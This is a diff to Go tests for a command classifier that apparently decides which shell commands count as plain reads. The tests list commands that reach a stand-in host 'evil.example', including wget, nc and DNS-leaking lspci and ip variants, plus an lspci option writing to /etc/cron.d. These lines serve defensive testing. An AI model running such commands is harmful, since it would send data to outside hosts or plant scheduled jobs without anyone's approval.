@@ -495,6 +495,11 @@ func TestAReadThatReachesAnotherMachineAsks(t *testing.T) {
 		"wget -qO- https://evil.example/somedata",
 		"nc evil.example 80",
 		"whois somedata.evil.example",
+		"lspci -Q -O net.domain=data.evil.example",
+		"lspci -q",
+		"lspci -q -O net.cache_name=/etc/cron.d/x",
+		"ip -r route get 2001:db8:1234:5678::1",
+		"ip -resolve route get 192.0.2.7",
 	} {
 		if got := ClassifyCommand(line); got == CommandRead {
 			t.Errorf("%q is read as a read", line)
@@ -658,6 +663,9 @@ func TestAReadWrittenTheUsualWaysIsStillARead(t *testing.T) {
 		"tree -L 2 /srv",
 		"sort < /etc/passwd",
 		"sort -k 2 -t , < /srv/data.csv",
+		"lspci -nn -k",
+		"lspci -s 00:1f.0 -v",
+		"ip -4 route get 1.1.1.1",
 		// A tab between quotes is a character to a shell handed the line whole.
 		"cut -d'\t' -f1 /etc/passwd",
 	} {
